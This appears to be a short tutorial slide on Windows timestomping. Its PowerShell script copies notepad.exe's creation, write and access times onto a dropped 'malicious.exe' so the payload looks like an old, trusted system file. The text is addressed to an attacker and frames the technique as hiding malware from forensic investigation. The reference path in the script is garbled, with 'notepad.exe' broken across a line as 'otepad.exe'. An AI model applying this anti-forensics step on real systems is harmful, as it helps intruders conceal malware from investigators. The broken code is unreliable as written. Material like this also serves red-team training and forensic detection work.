Timestomping on Windows

Using PowerShell to Modify File Timestamps

  • •Windows tracks CreationTime, LastWriteTime, and LastAccessTime.
  • •PowerShell allows direct manipulation of these file properties.
  • •Match timestamps to legitimate system binaries like notepad.exe.
Example Scenario

After dropping malicious.exe, you modify its timestamps to match notepad.exe, making it appear as an old, trusted system file.

Key Takeaway

PowerShell provides precise control over file timestamps on Windows, enabling attackers to effectively hide the age of their malicious payloads from forensic scrutiny.

# Get the timestamp of a legitimate file
$refFile = Get-Item C:\Windows\System32
otepad.exe
$creationTime = $refFile.CreationTime
$lastWriteTime = $refFile.LastWriteTime
$lastAccessTime = $refFile.LastAccessTime

# Apply to your malicious file
$malFile = Get-Item C:\ProgramData\malicious.exe
$malFile.CreationTime = $creationTime
$malFile.LastWriteTime = $lastWriteTime
$malFile.LastAccessTime = $lastAccessTime

# Verify new timestamps (example output)
Get-Item C:\ProgramData\malicious.exe | Select-Object CreationTime, LastWriteTime, LastAccessTime
# CreationTime   : 1/15/2022 8:30:00 AM
# LastWriteTime  : 1/15/2022 8:30:00 AM
# LastAccessTime : 1/15/2022 8:30:00 AM
Explanation

This script first captures the timestamps from a trusted system file. Then, it applies those exact timestamps to your malicious file, making it appear as if it was created or modified at the same time as the legitimate reference file.
